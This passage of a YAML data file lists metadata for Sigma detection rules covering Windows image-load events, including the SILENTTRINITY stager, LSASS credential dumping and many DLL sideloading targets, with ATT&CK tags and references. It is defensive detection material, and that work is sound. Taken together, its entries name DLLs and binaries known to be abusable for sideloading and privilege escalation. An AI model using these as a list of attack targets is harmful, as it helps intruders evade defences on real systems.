- detection_id: 75c505b1-711d-4f68-a357-8c3fe37dbf2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_hktl_silenttrinity_stager.yml
  name: HackTool - SILENTTRINITY Stager DLL Load
  description: Detects SILENTTRINITY stager dll loading activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1071
  tags:
  - attack.command-and-control
  - attack.t1071
  time_window: ''
  references:
  - https://github.com/byt3bl33d3r/SILENTTRINITY
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f354eba5-623b-450f-b073-0b5b2773b6aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_iexplore_dcom_iertutil_dll_hijack.yml
  name: Potential DCOM InternetExplorer.Application DLL Hijack - Image Load
  description: Detects potential DLL hijack of "iertutil.dll" found in the DCOM InternetExplorer.Application
    Class
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  - T1021.003
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1021.003
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteDCOMIErtUtilDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 857c8db3-c89b-42fb-882b-f681c7cf4da2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_lsass_unsigned_image_load.yml
  name: Unsigned Image Loaded Into LSASS Process
  description: Loading unsigned image (DLL, EXE) into LSASS process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Valid user connecting using RDP
  notes: ''
- detection_id: ff0f2b05-09db-4095-b96d-1b75ca24894a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_dotnet_assembly_dll_load.yml
  name: DotNET Assembly DLL Loaded Via Office Application
  description: Detects any assembly DLL being loaded by an Office Product
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
  false_positives:
  - Unknown
  notes: ''
- detection_id: d13c43f0-f66b-4279-8b2c-5912077c1780
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_dotnet_clr_dll_load.yml
  name: CLR DLL Loaded Via Office Applications
  description: Detects CLR DLL being loaded by an Office Product
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
  false_positives:
  - Unknown
  notes: ''
- detection_id: 90217a70-13fc-48e4-b3db-0d836c5824ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_dotnet_gac_dll_load.yml
  name: GAC DLL Loaded Via Office Applications
  description: Detects any GAC DLL being loaded by an Office Product
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
  false_positives:
  - Legitimate macro usage. Add the appropriate filter according to your environment
  notes: ''
- detection_id: af4c4609-5755-42fe-8075-4effb49f5d44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_excel_xll_susp_load.yml
  name: Microsoft Excel Add-In Loaded From Uncommon Location
  description: Detects Microsoft Excel loading an Add-In (.xll) file from an uncommon
    location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/lnk-between-browsers
  - https://wazuh.com/blog/detecting-xll-files-used-for-dropping-fin7-jssloader-with-wazuh/
  false_positives:
  - Some tuning might be required to allow or remove certain locations used by the
    rule if you consider them as safe locations
  notes: ''
- detection_id: 9a0b8719-cd3c-4f0a-90de-765a4cb3f5ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_outlook_outlvba_load.yml
  name: Microsoft VBA For Outlook Addin Loaded Via Outlook
  description: Detects outlvba (Microsoft VBA for Outlook Addin) DLL being loaded
    by the outlook process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=58
  false_positives:
  - Legitimate macro usage. Add the appropriate filter according to your environment
  notes: ''
- detection_id: bb2ba6fb-95d4-4a25-89fc-30bb736c021a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_powershell_dll_load.yml
  name: PowerShell Core DLL Loaded Via Office Application
  description: Detects PowerShell core DLL being loaded by an Office Product
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: e6ce8457-68b1-485b-9bdd-3c2b5d679aa9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_office_vbadll_load.yml
  name: VBA DLL Loaded Via Office Application
  description: Detects VB DLL's loaded by an office application. Which could indicate
    the presence of VBA Macros.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
  false_positives:
  - Legitimate macro usage. Add the appropriate filter according to your environment
  notes: ''
- detection_id: f40017b3-cb2e-4335-ab5d-3babf679c1de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_rundll32_remote_share_load.yml
  name: Remote DLL Load Via Rundll32.EXE
  description: Detects a remote DLL load event via "rundll32.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://github.com/gabe-k/themebleed
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: b439f47d-ef52-4b29-9a2f-57d8a96cb6b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_scrcons_wmi_scripteventconsumer.yml
  name: WMI ActiveScriptEventConsumers Activity Via Scrcons.EXE DLL Load
  description: Detects signs of the WMI script host process "scrcons.exe" loading
    scripting DLLs which could indicates WMI ActiveScriptEventConsumers EventConsumers
    activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://twitter.com/HunterPlaybook/status/1301207718355759107
  - https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
  - https://threathunterplaybook.com/hunts/windows/200902-RemoteWMIActiveScriptEventConsumers/notebook.html
  false_positives:
  - Legitimate event consumers
  - Dell computers on some versions register an event consumer that is known to cause
    false positives when brightness is changed by the corresponding keyboard button
  notes: ''
- detection_id: 4f6edb78-5c21-42ab-a558-fd2a6fc1fd57
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_7za.yml
  name: Potential 7za.DLL Sideloading
  description: Detects potential DLL sideloading of "7za.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.gov.pl/attachment/ee91f24d-3e67-436d-aa50-7fa56acf789d
  false_positives:
  - Legitimate third party application located in "AppData" may leverage this DLL
    to offer 7z compression functionality and may generate false positives. Apply
    additional filters as needed.
  notes: ''
- detection_id: 799a5f48-0ac1-4e0f-9152-71d137d48c2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_abused_dlls_susp_paths.yml
  name: Abusable DLL Potential Sideloading From Suspicious Location
  description: Detects potential DLL sideloading of DLLs that are known to be abused
    from suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
  - https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 552b6b65-df37-4d3e-a258-f2fc4771ae54
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_antivirus.yml
  name: Potential Antivirus Software DLL Sideloading
  description: Detects potential DLL sideloading of DLLs that are part of antivirus
    software suchas McAfee, Symantec...etc
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  false_positives:
  - Applications that load the same dlls mentioned in the detection section. Investigate
    them and filter them out if a lot FPs are caused.
  - Dell SARemediation plugin folder (C:\Program Files\Dell\SARemediation\plugin\log.dll)
    is known to contain the 'log.dll' file.
  - The Canon MyPrinter folder 'C:\Program Files\Canon\MyPrinter\' is known to contain
    the 'log.dll' file
  notes: ''
- detection_id: ee6cea48-c5b6-4304-a332-10fc6446f484
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_appverifui.yml
  name: Potential appverifUI.DLL Sideloading
  description: Detects potential DLL sideloading of "appverifUI.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://web.archive.org/web/20220519091349/https://fatrodzianko.com/2020/02/15/dll-side-loading-appverif-exe/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 90ae0469-0cee-4509-b67f-e5efcef040f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_aruba_networks_virtual_intranet_access.yml
  name: Aruba Network Service Potential DLL Sideloading
  description: Detects potential DLL sideloading activity via the Aruba Networks Virtual
    Intranet Access "arubanetsvc.exe" process using DLL Search Order Hijacking
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/wdormann/status/1616581559892545537?t=XLCBO9BziGzD7Bmbt8oMEQ&s=09
  false_positives:
  - Unknown
  notes: ''
- detection_id: 952ed57c-8f99-453d-aee0-53a49c22f95d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_avkkid.yml
  name: Potential AVKkid.DLL Sideloading
  description: Detects potential DLL sideloading of "AVKkid.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1fbc0671-5596-4e17-8682-f020a0b995dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_ccleaner_du.yml
  name: Potential CCleanerDU.DLL Sideloading
  description: Detects potential DLL sideloading of "CCleanerDU.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://lab52.io/blog/2344-2/
  false_positives:
  - False positives could occur from other custom installation paths. Apply additional
    filters accordingly.
  notes: ''
- detection_id: 3735d5ac-d770-4da0-99ff-156b180bc600
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_ccleaner_reactivator.yml
  name: Potential CCleanerReactivator.DLL Sideloading
  description: Detects potential DLL sideloading of "CCleanerReactivator.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://lab52.io/blog/2344-2/
  false_positives:
  - False positives could occur from other custom installation paths. Apply additional
    filters accordingly.
  notes: ''
- detection_id: 72ca7c75-bf85-45cd-aca7-255d360e423c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_chrome_frame_helper.yml
  name: Potential Chrome Frame Helper DLL Sideloading
  description: Detects potential DLL sideloading of "chrome_frame_helper.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/entries/3rd_party/google/chrome_frame_helper.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: caa02837-f659-466f-bca6-48bde2826ab4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_classicexplorer32.yml
  name: Potential DLL Sideloading Via ClassicExplorer32.dll
  description: Detects potential DLL sideloading using ClassicExplorer32.dll from
    the Classic Shell software
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets
  - https://app.any.run/tasks/6d8cabb0-dcda-44b6-8050-28d6ce281687/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6360757a-d460-456c-8b13-74cf0e60cceb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_comctl32.yml
  name: Potential DLL Sideloading Via comctl32.dll
  description: Detects potential DLL sideloading using comctl32.dll to obtain system
    privileges
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://github.com/binderlabs/DirCreate2System
  - https://github.com/sailay1996/awesome_windows_logical_bugs/blob/60cbb23a801f4c3195deac1cc46df27c225c3d07/dir_create2system.txt
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0fa66f66-e3f6-4a9c-93f8-4f2610b00171
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_coregen.yml
  name: Potential DLL Sideloading Using Coregen.exe
  description: Detect usage of the "coregen.exe" (Microsoft CoreCLR Native Image Generator)
    binary to sideload arbitrary DLLs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1055
  - T1218
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1218
  - attack.t1055
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Coregen/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2b140a5c-dc02-4bb8-b6b1-8bdb45714cde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_cpl_from_non_system_location.yml
  name: System Control Panel Item Loaded From Uncommon Location
  description: Detects image load events of system control panel items (.cpl) from
    uncommon or non-system locations which might be the result of sideloading.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/
  - https://www.hexacorn.com/blog/2024/01/01/1-little-known-secret-of-hdwwiz-exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9ca2bf31-0570-44d8-a543-534c47c33ed7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_dbgcore.yml
  name: Potential DLL Sideloading Of DBGCORE.DLL
  description: Detects DLL sideloading of "dbgcore.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  false_positives:
  - Legitimate applications loading their own versions of the DLL mentioned in this
    rule
  notes: ''
- detection_id: 6414b5cd-b19d-447e-bb5e-9f03940b5784
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_dbghelp.yml
  name: Potential DLL Sideloading Of DBGHELP.DLL
  description: Detects potential DLL sideloading of "dbghelp.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  false_positives:
  - Legitimate applications loading their own versions of the DLL mentioned in this
    rule
  notes: ''
- detection_id: fef394cd-f44d-4040-9b18-95d92fe278c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_dbgmodel.yml
  name: Potential DLL Sideloading Of DbgModel.DLL
  description: Detects potential DLL sideloading of "DbgModel.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/entries/microsoft/built-in/dbgmodel.html
  false_positives:
  - Legitimate applications loading their own versions of the DLL mentioned in this
    rule
  notes: ''
- detection_id: edd3ddc3-386f-4ba5-9ada-4376b2cfa7b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_eacore.yml
  name: Potential EACore.DLL Sideloading
  description: Detects potential DLL sideloading of "EACore.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e4903324-1a10-4ed3-981b-f6fe3be3a2c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_edputil.yml
  name: Potential Edputil.DLL Sideloading
  description: Detects potential DLL sideloading of "edputil.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://alternativeto.net/news/2023/5/cybercriminals-use-wordpad-vulnerability-to-spread-qbot-malware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4fc0deee-0057-4998-ab31-d24e46e0aba4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_from_non_system_location.yml
  name: Potential System DLL Sideloading From Non System Locations
  description: Detects DLL sideloading of DLLs usually located in system locations
    (System32, SysWOW64, etc.).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 15
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://hijacklibs.net/
  - https://blog.cyble.com/2022/07/21/qakbot-resurfaces-with-new-playbook/
  - https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/
  - https://github.com/XForceIR/SideLoadHunter/blob/cc7ef2e5d8908279b0c4cee4e8b6f85f7b8eed52/SideLoads/README.md
  - https://www.hexacorn.com/blog/2023/12/26/1-little-known-secret-of-runonce-exe-32-bit/
  false_positives:
  - Legitimate applications loading their own versions of the DLLs mentioned in this
    rule
  notes: ''
- detection_id: b6188d2f-b3c4-4d2c-a17d-9706e0851af0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_goopdate.yml
  name: Potential Goopdate.DLL Sideloading
  description: Detects potential DLL sideloading of "goopdate.dll", a DLL used by
    googleupdate.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - False positives are expected from Google Chrome installations running from user
    locations (AppData) and other custom locations. Apply additional filters accordingly.
  - Other third party chromium browsers located in AppData
  notes: ''
- detection_id: e49b5745-1064-4ac1-9a2e-f687bc2dd37e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_gup_libcurl.yml
  name: Potential DLL Sideloading Of Libcurl.DLL Via GUP.EXE
  description: Detects potential DLL sideloading of "libcurl.dll" by the "gup.exe"
    process from an uncommon location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4c21b805-4dd7-469f-b47d-7383a8fcb437
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_iviewers.yml
  name: Potential Iviewers.DLL Sideloading
  description: Detects potential DLL sideloading of "iviewers.dll" (OLE/COM Object
    Interface Viewer)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.secureworks.com/research/shadowpad-malware-analysis
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7a3b6d1f-4a2b-4f8c-9d7e-e9f8cbf21a35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_side_load_jli.yml
  name: Potential JLI.dll Side-Loading
  description: 'Detects potential DLL side-loading of jli.dll.

